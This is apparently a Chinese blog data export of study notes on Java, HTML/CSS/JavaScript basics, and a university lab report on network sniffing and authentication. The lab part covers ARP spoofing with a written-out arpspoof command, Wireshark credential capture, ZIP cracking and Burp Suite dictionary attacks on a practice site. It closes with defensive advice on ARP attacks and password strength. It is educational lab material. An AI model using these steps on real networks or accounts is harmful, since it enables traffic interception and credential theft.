标识这个注解怎么保存，是只在代码中，还是编入class文件中，或者是在运行时可以通过反射访问。@Documented - 标记这些注解是否包含在用户文档中。@Target - 标记这个注解应该是哪种 Java 成员。@Inherited - 标记这个注解是继承于哪个注解类(默认 注解并没有继承于任何子类)从 Java 7 开始，额外添加了 3 个注解:@SafeVarargs - Java 7 开始支持，忽略任何使用参数为泛型变量的方法或构造函数调用产生的警告。@FunctionalInterface - Java 8 开始支持，标识一个匿名函数或函数式接口。@Repeatable - Java 8 开始支持，标识某注解可以在同一个声明上使用多次。","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"Java","slug":"开发/Java","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"}]},{"title":"Java基本语法","slug":"java基本语法","date":"2023-12-23T05:51:38.220Z","updated":"2023-12-23T09:08:58.151Z","comments":true,"path":"2023/12/23/java基本语法/","permalink":"http://example.com/2023/12/23/java%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/","excerpt":"","text":"Java基本语法注释123单行注释 //多行注释 /* */文档注释 /** */ 变量与运算符关键字的使用123关键字：被Java语言赋予了特殊含义，用做专门用途的字符串 如 class public static void 等都是关键字 关键字都是小写 标识符的使用12345678910111213Java中变量、方法、类等要素命名时使用的字符序列，被称为标识符 凡是自己可以起名字的地方都叫标识符 命名规则 1.字母、数字、_、$组成 2.数字不可以开头 3.不可以使用关键字、保留字，但可以包含关键字、保留字 4.Java中严格区分大小写，长度无限制 5.不能包含空格 命名规范 1.包名 多单词时所有单词都小写 java.lang 2.类名、接口名 多单词时所有单词首字母大写 HelloWorld 3.变量名、方法名 多单词时第一个首字母小写，第二个开始首字母大写 bookName 4.常量名 所有字母大写，多单词时用_连接 MAX_VALUE 变量的使用与数据类型12345678910111213141516171819202122232425262728293031概念：内存中的一个存储区域，该区域的数据可以在同一类型范围内不断变化要素：数据类型、变量名、存储的值格式：数据类型 变量名=变量值 int a=1;使用： 变量先声明后使用数据类型： 整形 byte short int long 需要以1或者L作为后缀 浮点型 float 单精度 需要以f或者F作为后缀 double 双精度 字符型 char 单字符 布尔型 boolean 类 class 数组 array 接口 interface 枚举 enum 注解 annotation 记录 record强制类型转换 float b=(float)a; String类12字符串 StringString str=&#x27;hello&#x27;; 运算符123456算术运算符 + - * / % ++ --赋值运算符 = += -= *= /= %= &gt;&gt;= &lt;&lt;= &gt;&gt;&gt;= &amp;= |= ^=等比较运算符 &gt; &lt; &gt;= &lt;= == !=逻辑运算符 || &amp;&amp; | &amp; ^ ! 位运算符 &amp; | ^ ~ &lt;&lt; &gt;&gt; &gt;&gt;&gt;条件运算符 条件？ 结果1:结果2 if-else123456789if(布尔表达式 1)&#123; //如果布尔表达式 1的值为true执行代码&#125;else if(布尔表达式 2)&#123; //如果布尔表达式 2的值为true执行代码&#125;else if(布尔表达式 3)&#123; //如果布尔表达式 3的值为true执行代码&#125;else &#123; //如果以上布尔表达式都不为true执行代码&#125; Scanner类1234 //Scanner 类可以来获取用户的输入 Scanner scan = new Scanner(System.in);String str1 = scan.next();//空格结束String str2 = scan.nextLine();//回车结束 switch-case1234567891011switch(expression)&#123; case value : //语句 break; //可选 case value : //语句 break; //可选 //你可以有任意数量的case语句 default : //可选 //语句&#125; 循环结构for循环123for(初始化; 布尔表达式; 更新) &#123; //代码语句&#125; while循环123while( 布尔表达式 ) &#123; //循环内容&#125; do-while循环123456//对于 while 语句而言，如果不满足条件，则不能进入循环。但有时候我们需要即使不满足条件，也至少执行一次。do…while 循环和 while 循环相似，不同的是，do…while 循环至少会执行一次。do &#123; //代码语句&#125;while(布尔表达式); 数组一维数组12345678910111213//声明数组 int arr[]; //初始化 arr=new int[]&#123;1,2,3,5,6,9,7&#125;; //调用 System.out.println(arr[6]); //数组长度 System.out.println(arr.length); //For-Each 循环 也可以用其他循环 for(int element: arr) &#123; System.out.println(element); &#125; 多维数组12345678910111213141516//声明数组 int arr[][]; //初始化 arr=new int[][]&#123;&#123;1&#125;,&#123;2,3&#125;,&#123;5,6,9,7&#125;&#125;; //调用 System.out.println(arr[0][0]); //数组长度 System.out.println(arr.length); //For-Each 循环 也可以用其他循环 for(int[] element: arr) &#123; for(int cow:element) &#123; System.out.println(cow); &#125; &#125;","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"Java","slug":"开发/Java","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"}]},{"title":"前端3剑客","slug":"前端3剑客","date":"2023-12-21T15:17:57.017Z","updated":"2023-12-23T05:22:43.986Z","comments":true,"path":"2023/12/21/前端3剑客/","permalink":"http://example.com/2023/12/21/%E5%89%8D%E7%AB%AF3%E5%89%91%E5%AE%A2/","excerpt":"","text":"前端3剑客HTML标题123&lt;h1&gt;标题h1&lt;/h1&gt;&lt;h2&gt;标题h2&lt;/h2&gt;&lt;!-- h1到h6 --&gt; 段落1234567&lt;p&gt; 亚洲政策研究所 （API） 成立于 2023 年 5 月，是一家位于新泽西州的独立 501（c）（3） 非营利性研究机构。 我们专注于对亚洲面临的问题进行政策研究，应对亚洲各地的关键挑战，为政治家和企业提供政策见解&lt;/p&gt; 我们的核心竞争力在于提供高影响力、高成本效益的社会研究，为政治家和企业提供建议， 为亚洲的政策制定提供适当的方向，以创造亚洲更美好的未来&lt;p&gt; 换行12345678&lt;p&gt; 亚洲政策研究所 （API） 成立于 2023 年 5 月，是一家位于新泽西州的独立 501（c）（3） 非营利性研究机构。&lt;br&gt; 我们专注于对亚洲面临的问题进行政策研究，应对亚洲各地的关键挑战，为政治家和企业提供政策见解&lt;/p&gt; 我们的核心竞争力在于提供高影响力、高成本效益的社会研究，为政治家和企业提供建议，&lt;br&gt; 为亚洲的政策制定提供适当的方向，以创造亚洲更美好的未来&lt;p&gt; &lt;!-- br普通换行，hr换行加线 --&gt; 列表1234567891011121314&lt;!---有序列表 ol无序列表 ul列表项 li--&gt; &lt;ol&gt; &lt;li&gt;ol1&lt;/li&gt; &lt;li&gt;ol2&lt;/li&gt; &lt;/ol&gt; &lt;ul&gt; &lt;li&gt;ul1&lt;/li&gt; &lt;li&gt;ul2&lt;/li&gt; &lt;/ul&gt; 超链接12345678&lt;!--a href 目标的地址 target 打开方式 _self 当前页面 _blank 新页面--&gt;&lt;a href=&quot;http://www.baidu.com&quot; target=&quot;_blank&quot;&gt;baidu&lt;/a&gt; 图片12345678&lt;!--img src 图片路径 title 鼠标悬停时提示的文字 alt 加载失败时提示的文字--&gt;&lt;img src=&quot;&quot; alt=&quot;&quot;&gt; 表格1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;!--table 整张表格 boder 加线条 thead 表头 tbody 表体 tfoot 表尾 tr 表格中的一行 td 行中的一个单元格 rowspan 让单元格跨行 colspan 让单元格跨列 th 自带加粗居中效果的td--&gt;&lt;h3 style=&quot;text-align: center;&quot;&gt;员工技能竞赛评分表&lt;/h3&gt; &lt;table border=&quot;1px&quot; style=&quot;margin: 0px auto;&quot;&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;排名&lt;/th&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;分数&lt;/th&gt; &lt;th&gt;备注&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;tr&gt; &lt;td&gt;1&lt;/td&gt; &lt;td&gt;小明&lt;/td&gt; &lt;td&gt;100&lt;/td&gt; &lt;td rowspan=&quot;4&quot;&gt;前3名加薪&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;2&lt;/td&gt; &lt;td&gt;小白&lt;/td&gt; &lt;td&gt;99&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;3&lt;/td&gt; &lt;td&gt;小黑&lt;/td&gt; &lt;td&gt;98&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;总人数&lt;/td&gt; &lt;td colspan=&quot;2&quot;&gt;200&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;tfoot&gt; &lt;/tfoot&gt; &lt;/table&gt; 表单12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;!--form action 数据提交地址 method 提交方式 get/post input type 输入信息类型 text 普通文本框 passowrd 密码框 定义name属性 submit 提交按钮 reset 重置按钮 定义value属性 radio 单选框 多个单选框使用相同name属性，则会有互斥效果 设置value属性提交 设置checked属性默认值 checkbox 复选框 hidde 隐藏域 页面不会显示 可提交 readonly 页面显示但不能修改 可提交 disabled 页面显示但不能修改 不可提交 textarea 文本域 select 下拉框 option 选项 selected 默认值 file 文件上传框--&gt;&lt;form action=&quot;01firstpage.html&quot; method=&quot;get&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;123&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;pid&quot; value=&quot;4556&quot; readonly&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;tid&quot; value=&quot;789&quot; disabled&gt;&lt;br&gt; 用户名：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt; 密码： &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt; 性别：&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;1&quot; checked=&quot;true&quot;&gt;男 &lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;2&quot;&gt;女 &lt;br&gt; 爱好：&lt;input type=&quot;checkbox&quot; value=&quot;1&quot; name=&quot;hobby&quot;&gt;蓝球 &lt;input type=&quot;checkbox&quot; value=&quot;2&quot; name=&quot;hobby&quot;&gt;足球 &lt;input type=&quot;checkbox&quot; value=&quot;3&quot; name=&quot;hobby&quot;&gt;乒乓球&lt;br&gt; 个人简介：&lt;textarea name=&quot;intro&quot; id=&quot;2&quot; cols=&quot;30&quot; rows=&quot;10&quot;&gt;&lt;/textarea&gt;&lt;br&gt; 籍贯： &lt;select name=&quot;pro&quot; id=&quot;1&quot;&gt; &lt;option value=&quot;1&quot;&gt;广西&lt;/option&gt; &lt;option value=&quot;2&quot;&gt;广东&lt;/option&gt; &lt;option value=&quot;0&quot; selected&gt;请选择&lt;/option&gt; &lt;/select&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;登陆&quot;&gt; &lt;input type=&quot;reset&quot; value=&quot;清空&quot;&gt; &lt;/form&gt; 布局123456789&lt;!--div 相当与盒子 块元素 css样式的宽 高等 往往都是生效的span 行内元素 css样式的宽 高等 往往都是不生效的--&gt;&lt;div style=&quot;border: 1px solid red; width: 500px;height: 200px; margin: 10px auto;&quot;&gt;123&lt;/div&gt; &lt;div style=&quot;border: 1px solid red; width: 500px;height: 200px; margin: 10px auto;&quot;&gt;456&lt;/div&gt; &lt;div style=&quot;border: 1px solid red; width: 500px;height: 200px; margin: 10px auto;&quot;&gt;789&lt;/div&gt; &lt;span style=&quot;border: 1px solid red; width: 500px;height: 200px; margin: 10px auto;&quot;&gt;555&lt;/span&gt; CSS引入方式​ 12345678910111213141516171819202122232425&lt;!--方式1 行内式 通过元素的的style属性引入式 语法：style=&quot;样式名：样式值;样式名:样式值......&quot;--&gt;&lt;button style=&quot;width: 60px;height: 40px; background-color: aqua; color: white;border-radius: 5px;&quot; class=&quot;butt&quot; id=&quot;2&quot;&gt;按钮&lt;/button&gt;&lt;!--方式2 内嵌式 通过head标签中的style定义本页面的公共样式 --&gt;button&#123; width: 60px;height: 40px; background-color: aqua; color: white;border-radius: 5px; &#125;&lt;!--方式3 外部样式表 将css代码单独放入.css文件中，html在head中通过link标签引入--&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;btn.css&quot;&gt; ​ css选择器12345678910111213141516&lt;!-- 元素选择器 --&gt;button&#123; width: 60px;height: 40px; background-color: aqua; color: white;border-radius: 5px; &#125;&lt;!-- id选择器 --&gt;#2&#123; width: 60px;height: 40px; background-color: aqua; color: white;border-radius: 5px;&#125;&lt;!-- class选择器 一个元素可以有多个class--&gt;.bott&#123; width: 60px;height: 40px; background-color: aqua; color: white;border-radius: 5px;&#125; css浮动123456789&lt;!--float 使多个div在同一行--&gt;&lt;div style=&quot;background-color: brown;height: 100px;&quot;&gt; &lt;div style=&quot;background-color: antiquewhite;float: right;&quot;&gt;123&lt;/div&gt; &lt;div style=&quot; background-color: beige;float: right;&quot;&gt;456&lt;/div&gt; &lt;div style=&quot;background-color: blue;float: right;&quot;&gt;789&lt;/div&gt; &lt;/div&gt; css定位12345678910111213141516&lt;!--position static 默认 relative 相对 对于元素原来位置 fixed 相对 固定在浏览器页面（页面滑动还是在页面原来位置） absolute 绝对 对于浏览器 left right top bottom--&gt;&lt;div style=&quot;height: 100px;&quot;&gt; &lt;div style=&quot;background-color: antiquewhite; position: fixed;bottom: 75px;&quot;&gt;123&lt;/div&gt; &lt;div style=&quot; background-color: beige;&quot;&gt;456&lt;/div&gt; &lt;div style=&quot;background-color: blue;position: relative;left: 75px;&quot;&gt;789&lt;/div&gt; &lt;/div&gt; css盒子模型12345678910111213&lt;!--Margin(外边距) - 清除边框外的区域，外边距是透明的。Border(边框) - 围绕在内边距和内容外的边框。Padding(内边距) - 清除内容周围的区域，内边距是透明的。Content(内容) - 盒子的内容，显示文本和图像。--&gt;div &#123; width: 300px; border: 25px solid green; padding: 25px; margin: 25px;&#125; js引入方式1234567891011121314151617&lt;!--1.内嵌式 在head中通过script标签定义脚本代码--&gt; &lt;script&gt; function suprise()&#123; alert(&quot;惊喜&quot;); &#125;&lt;/script&gt;&lt;button onclick=&quot;suprise()&quot;&gt;点我有惊喜&lt;/button&gt;&lt;!--2.引入外部脚本文件 在head中通过script引入外部js文件--&gt; &lt;script src=&quot;js/button.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt; 数据类型和变量1234567891011121314&lt;!--1.js中的变量声明都用var var a=10 var str=&quot;abc&quot;2.console.log 输出在控制台3.prompt 输入4.数据类型 数值类型 number 整数 小数 字符串 string 布尔类型 boolean 引用类型 Object 函数 function 变量先赋值后判断类型 --&gt; 运算符12345678910&lt;!--1.算数 + - * / %2.复合 ++ -- += -= *= /= %=3.关系 &gt; &lt; &gt;= &lt;= != == === == 如果两端的数据类型不一致，会尝试两端的数据类型都转换位number再对比 === 如果两端的数据类型不一致，直接返回false，相同则会返回true4.逻辑 $$ ||5.条件 条件表达式? 值1 : 值26.位 | &amp; ^ &gt;&gt; &lt;&lt; &gt;&gt;&gt;--&gt; 分支机构123456789101112131415161718192021&lt;!-- if else ---&gt;if()&#123;&#125;else if()&#123; &#125;else&#123; &#125;&lt;!-- switch --&gt;switch()&#123; case 1: break case 2: break case 3: break dafault:&#125; 循环结构123456789&lt;!-- while --&gt;while()&#123; &#125;&lt;!-- for --&gt;for()&#123; &#125; 函数12345&lt;!--1.函数声明 function 函数名()&#123;&#125; var 函数名=function()&#123;&#125;--&gt; 对象123456789101112131415161718192021222324252627282930&lt;!--对象的创建 1.new Object() 2.&#123;属性名:属性值,... ..., 函数名:fuinction()&#123;&#125;&#125;--&gt;var person=new Object() //添加属性 person.name=&#x27;张三&#x27; person.age=20 //添加方法 person.eat=function(food)&#123; console.log(name+&#x27;正在吃&#x27;+food) &#125; //访问属性 console.log(person.name) //调用方法 person.eat(&#x27;火锅&#x27;)var person=&#123; name:&#x27;张三&#x27;, age:20, eat:function(food)&#123; console.log(name+&#x27;正在吃&#x27;+food) &#125; &#125; //访问属性 console.log(person.name) //调用方法 person.eat(&#x27;火锅&#x27;) JSON12345678&lt;!--JSON格式 var personStr=&#x27;&#123;&quot;属性名1&quot;:&quot;属性值2&quot;,&quot;属性名2&quot;:&quot;属性值2&quot;,&quot;属性名&quot;:&#123;&#125;,&quot;属性名&quot;:[]&#125;&#x27;通过JSON.parse()可以将一个JSON串转换为一个对象 var person=JSON.parse(personStr)通过JSON.stringify()可以将一个对象转换为JSON串 var personStr=JSON.stringify(person)--&gt;","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"前端","slug":"开发/前端","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://example.com/tags/%E5%89%8D%E7%AB%AF/"}]},{"title":"实验二 网络嗅探与身份认证","slug":"实验二 网络嗅探与身份认证","date":"2023-12-20T09:42:06.014Z","updated":"2023-12-20T12:43:59.514Z","comments":true,"path":"2023/12/20/实验二 网络嗅探与身份认证/","permalink":"http://example.com/2023/12/20/%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81/","excerpt":"","text":"实验二 网络嗅探与身份认证实验目的：1、通过使用Wireshark软件掌握Sniffer（嗅探器）工具的使用方法，实现捕捉HTTP等协议的数据包，以理解TCP&#x2F;IP协议中多种协议的数据结构、通过实验了解HTTP等协议明文传输的特性。 2、研究交换环境下的网络嗅探实现及防范方法，研究并利用ARP协议的安全漏洞，通过Arpspoof实现ARP欺骗以捕获内网其他用户数据。 3、能利用BrupSuite实现网站登录暴力破解获得登录密码。 4、能实现ZIP密码破解，理解安全密码的概念和设置。 系统环境：Kali Linux 2、Windows 网络环境：交换网络结构 实验工具：Arpspoof、WireShark、BurpSuite、fcrackzip（用于zip密码破解）。 实验原理：网络嗅探 1、网络嗅探概述 Sniffer（嗅探器）工作在OSI模型的第二层，利用计算机的网卡截获网络数据报文的一种工具，可用来监听网络中的数据，分析网络的流量，以便找出所关心的网络中潜在的问题。例如,假设网络的某一段运行得不是很好,报文的发送比较慢,而我们又不知道问题出在什么地方,此时就可以用嗅探器确定不同网络协议、不同用户的通信流量，相互主机的报文传送间隔时间等，这些信息为管理员判断网络问题、管理网络区域提供了非常宝贵的信息。 在正常情况下，一个合法的网络接口应该只响应这样的两种数据帧：帧的目标区域具有和本地网络接口相匹配的硬件地址；帧的目标区域具有“广播地址”。 如果网卡处于混杂（promiscuous）模式，那么它就可以捕获网络上所有的数据帧，处于对网络的“监听”状态，如果一台机器被配置成这样的方式，它（包括其软件）就是一个嗅探器。 在交换型以太网中，上述条件2是不满足的。所有的主机连接到SWITCH，SWITCH比HUB更聪明，它知道每台计算机的MAC地址信息和与之相连的特定端口，发给某个主机的数据包会被SWITCH从特定的端口送出，而不是象HUB那样，广播给网络上所有的机器。这种传输形式使交换型以太网的性能大大提高，同时还有一个附加的作用：使传统的嗅探器无法工作。 交换型网络环境嗅探的核心问题是：如何使本不应到达的数据包到达本地。通常的方法有MAC洪水包和ARP欺骗。其中MAC洪水包是向交换机发送大量含有虚构MAC地址和IP地址的IP包，使交换机无法处理如此多的信息，致使交换机就进入了所谓的”打开失效”模式，也就是开始了类似于集线器的工作方式，向网络上所有的机器广播数据包。 2、ARP欺骗 本实验中，我们将要详细分析ARP欺骗模式，并通过ARP欺骗达到交换网络嗅探的目的。 每一个主机都有一个ARP高速缓存，此缓存中记录了最近一段时间内其它IP地址与其MAC地址的对应关系。如果本机想与某台主机通信，则首先在ARP高速缓存中查找此台主机的IP和MAC信息，如果存在，则直接利用此MAC地址构造以太帧；如果不存在，则向本网络上每一个主机广播一个ARP请求报文，其意义是”如果你有此IP地址，请告诉我你的MAC地址”，目的主机收到此请求包后，发送一个ARP响应报文，本机收到此响应后，把相关信息记录在ARP高速缓存中，以下的步骤同上。 可以看出，ARP协议是有缺点的，第三方主机可以构造一个ARP欺骗报文，而源主机却无法分辨真假。如果发送者硬件地址字段填入攻击者的硬件地址，而发送者IP地址填入被假冒者的IP地址，那么就构造出了一个用于欺骗的ARP请求报文。那么被欺骗主机的ARP高速缓存，被假冒者的IP地址与其MAC地址的对应关系就会更改为欺骗者的，从而达到ARP欺骗的目的。特别的，如果攻击者冒充网关，将转发子网内到外网的所有通信量，以达到捕获其他主机的通信量，从而破坏数据传输的保密性。 3、密码（口令，Password）安全 在现实网络中，攻击事件发生的频率越来越高，其中相当多的都是由于网站密码泄露的缘故，或是人为因素导致，或是口令遭到破解，所以从某种角度而言，密码的安全问题不仅仅是技术上的问题，更主要的是人的安全意识问题。 3.1、口令破解方法 口令破解主要有两种方法：字典破解和暴力破解。 字典破解是指通过破解者对管理员的了解，猜测其可能使用某些信息作为密码，例如其姓名、生日、电话号码等，同时结合对密码长度的猜测，利用工具来生成密码破解字典。如果相关信息设置准确，字典破解的成功率很高，并且其速度快，因此字典破解是密码破解的首选。 而暴力破解是指对密码可能使用的字符和长度进行设定后（例如限定为所有英文字母和所有数字，长度不超过8），对所有可能的密码组合逐个实验。随着可能字符和可能长度的增加，存在的密码组合数量也会变得非常庞大，因此暴力破解往往需要花费很长的时间，尤其是在密码长度大于10，并且包含各种字符（英文字母、数字和标点符号）的情况下。 3.2、口令破解方式 口令破解主要有两种方式：离线破解和在线破解。 离线破解攻击者得到目标主机存放密码的文件后，就可以脱离目标主机，在其他计算机上通过口令破解程序穷举各种可能的口令，如果计算出的新密码与密码文件存放的密码相同，则口令已被破解。 3.3 候选口令产生器 候选口令产生器的作用是不断生成可能的口令。有几种方法产生候选口令，一种是用枚举法来构造候选口令（暴力破解），另一种方法是从一个字典文件里读取候选口令（字典破解）。 3.4 口令加密 口令加密过程就是用加密算法对从口令候选器送来的候选口令进行加密运算而得到密码。这要求加密算法要采用和目标主机一致的加密算法。加密算法有很多种，通常与操作系统或应用程序的类型和版本相关。 Burp Suite是一个用于测试Web应用程序安全性的图形工具。该工具使用Java编写，由PortSwigger Security开发。该工具有两个版本。可免费下载的免费版（免费版）和试用期后可购买的完整版（专业版）。免费版本功能显着降低。它的开发旨在为Web应用程序安全检查提供全面的解决方案，Burp Suite是进行Web应用安全测试集成平台。它将各种安全工具无缝地融合在一起，以支持整个测试过程中，从最初的映射和应用程序的攻击面分析，到发现和利用安全漏洞。 实验步骤和内容：网络嗅探部分：网络嗅探：Wireshark 监听网络流量，抓包。 ARP欺骗： ArpSpoof，实施ARP欺骗。 防范： 防范arp欺骗。 实验网络拓扑 1、A主机上外网，B运行sinffer(Wireshark)选定只抓源为A的数据)。回答：先设置 “echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward” 使目标ip正常上网 再使用arp欺骗 使用wirkeshack抓取目标流量包 1.1 写出以上过滤语句。回答：ip.src&#x3D;&#x3D;192.168.30.91 1.2 在互联网上找到任意一个以明文方式传递用户帐号、密码的网站，B是否能看到A和外网（该网站）的通信（A刚输入的帐户和口令）？为什么？ 回答：不能。因为， B的wireshark不在混杂模式下，所有的主机连接到SWITCH，SWITCH知道每台计算机的MAC地址和与之相连的特定端口，发给某个主机的数据包会被SWITCH从特定的端口送出，所以B不能得到A的外网通信。 2.1 为了捕获A到外网的数据，B实施ARP欺骗攻击，B将冒充该子网的什么实体？回答：B冒充网关 2.2 写出arpspoof命令格式。回答：arpspoof -i 网卡 -t 目标IP 网关 2.3 B是否能看到A和外网的通信（A输入的帐户和口令）？截图Wireshark中显示的明文信息。回答：（由于实验课结束，A换人，A的IP更改为192.168.30.194）A登陆pikachu，B抓包得到账号&#x2F;密码admin&#x2F;123456 FTP数据还原部分：利用WireShark打开实验实验数据data.pcapng。 3.1 FTP服务器的IP地址是多少？你是如何发现其为FTP服务器的？回答：192.168.182.1 FTP ip地址为192.168.182.1 因为请求方一直是192.168.182.132，回应方一直是192.168.182.132 3.2客户端登录FTP服务器的账号和密码分别是什么?回答：student&#x2F;sN46i5y 3.3 客户端从FTP下载或查看了2个文件，一个为ZIP文件，一个为TXT文件，文件名分别是什么？*提示：文件名有可能是中文。*回答：1.zip和复习.Txt 3.4 还原ZIP文件并打开（ZIP有解压密码，试图破解，提示：密码全为数字，并为6位）。截图破解过程。回答：将数据流另存为1.zip 再使用Ziperello暴力破解得到密码123456 得到一张企鹅图片 3.5 TXT文件的内容是什么？ 4、网站登录密码 利用人们平时常用的词、句破译，如果说暴力破解是一个一个的尝试那么字典破译就是利用人们习惯用人名、地名或者常见的词语设置成密码的习惯进行破译。字典破译速度比暴力破译更快但是有时候密码设置中包含了没有字典库中的词句就无法破解出来了，因此有好的字典是关键。 以pikachu为目标网站，构造字典（wordlist），其中包含你的正确密码，利用burpsuite进行字典攻击，实施字典攻击，你是如何判断某个密码为破解得到的正确密码，截图。 回答：随便输入账号和密码 通过bp抓包 发送到intruder并添加攻击位置，设置攻击方式为clusterbomb 导入字典并开始攻击 通过字典爆破得admin&#x2F;123456 5、MD5破解 SqlMap得到某数据库用户表信息，用户口令的MD5值为7282C5050CFE7DF5E09A33CA456B94AE 那么，口令的明文是什么？（提示：MD5值破解） 6、John the Ripper的作用是什么？ 回答：John the Ripper是一个密码破解工具，用于测试和评估密码的安全性。它可以通过多种方式破解密码，包括暴力破解、字典攻击和彩虹表攻击等。John the Ripper主要用于渗透测试和密码审计，帮助管理员评估系统中的弱密码并采取相应的安全措施。然而，请注意，使用John the Ripper或其他密码破解工具来未经授权地入侵他人系统是非法的行为。 思考问题：1、 谈谈如何防止ARP攻击。a.使用静态ARP表： 在网络中使用静态ARP表，将IP地址与MAC地址进行手动绑定。这样可以防止攻击者通过发送虚假的ARP响应来欺骗其他设备。 b.使用ARP防火墙： 部署ARP防火墙可以检测和阻止异常的ARP流量。这些防火墙可以监控网络上的ARP请求和响应，识别异常模式，并采取相应的阻止措施。 c.网络流量监测：实施网络流量监测工具，监控网络中的ARP请求和响应。异常的ARP流量模式可能表明ARP攻击正在发生。 c.端口安全特性： 使用交换机的端口安全特性，限制每个端口上允许的MAC地址数量。这可以防止攻击者通过在网络上发送大量虚假的ARP响应来引发混乱。 d.启用802.1X认证： 802.1X认证要求所有连接到网络的设备进行身份验证。只有通过身份验证的设备才能参与网络通信，从而减少了ARP攻击的风险。 e.使用VPN： 如果可能，使用虚拟专用网络（VPN）可以加密通信，使得攻击者更难截获和篡改网络通信。 f.定期审查ARP表： 管理员可以定期审查网络设备的ARP表，检查是否存在异常的或重复的条目。发现异常情况时，可以采取纠正措施。 g.网络安全培训： 对网络用户和管理员进行网络安全培训，使其了解ARP攻击的风险，并教导采取预防措施。 2、 安全的密码（口令）应遵循的原则。a.长度： 使用足够长度的密码，一般来说，密码长度越长越安全。推荐至少12个字符。 b.复杂性： 包含不同类型的字符，包括大写字母、小写字母、数字和特殊字符（例如！、@、#、$等）。 c.避免常见词语： 避免使用容易猜测的密码，如常见单词、词典单词、生日、名字等。攻击者可能使用字典攻击来猜测这些密码。 d.不重复使用： 对于不同的账户和服务，请使用不同的密码。这样，如果一个账户受到攻击，其他账户仍然安全。 e.定期更改： 定期更改密码以增加安全性。虽然不需要每个月都更改，但定期更改是一个好的安全实践。 f.避免个人信息： 避免在密码中使用与个人相关的信息，如姓名、生日、地址等。这些信息可能容易被猜测或获取。 g.密码管理器： 使用密码管理器来生成、存储和管理强密码。密码管理器可以帮助您记住复杂的密码，而不必在多个账户之间重复使用相同的密码。 h.双因素身份验证： 启用双因素身份验证，以提供额外的安全层。这通常涉及到除密码外的第二个身份验证步骤，例如手机验证码或硬件令牌。 h.教育和培训： 对用户进行安全培训，教育他们有关密码安全的最佳实践，以及如何识别和防范社会工程学攻击。 i.监控和更新： 定期监控账户活动，及时更新密码，特别是在发生数据泄露或安全事件后。 3、 谈谈字典攻击中字典的重要性。a.包含常见密码： 字典通常包含常见的、容易猜测的密码，如常见单词、数字组合、常见短语等。这些密码是攻击者最有可能尝试的。 b.多样性： 一个好的字典文件应该包含各种类型的密码，涵盖了可能出现的不同组合和模式。这包括大小写字母、数字、特殊字符以及它们的组合。 c.社会工程学元素： 一些字典可能包含基于社会工程学的信息，如常见的名字、生日、固定短语等，因为用户可能会使用与其个人信息相关的密码。 d.更新和维护： 随着时间的推移，密码的使用趋势和模式可能会发生变化。一个好的字典应该定期更新，以反映新的密码趋势和流行词汇。 e.攻击速度：字典攻击是一种高效的攻击方式，因为攻击者可以迅速尝试大量密码。一个包含大量可能密码的字典可以在短时间内覆盖广泛的选择。 f.组合和变种： 一些字典可能包含密码的组合和变种，例如通过在单词之间添加数字、特殊字符或重复字符。这增加了攻击的成功率。 f.密码生成规则： 字典文件可能包含密码生成规则，攻击者可以使用这些规则来生成更多可能的密码组合，而不仅仅是静态的字典列表。 g.定制字典： 攻击者可能会创建针对特定目标的定制字典，其中包含与目标相关的信息，如公司名、产品名、关键人物名字等。 4、 实验小结。（1）本次实验收获很大，了解了网络嗅探、ARP欺骗、密码安全等相关安全技术和问题。对相关安全和技术有了更加全面的了解。 （2）了解了ARP欺骗技术，让我们更深入了解了网关的作用，和wireshark的使用。同时，也告诉了我们，网站使用明文的方式传输密码是非常危险的，若用户遭受了arp欺骗，则很容易造成密码的泄露。 （3）ftp数据还原的部分，让我们更加熟悉了数据的获取，以及wireshark的使用，同时也对服务器有了一定的了解。 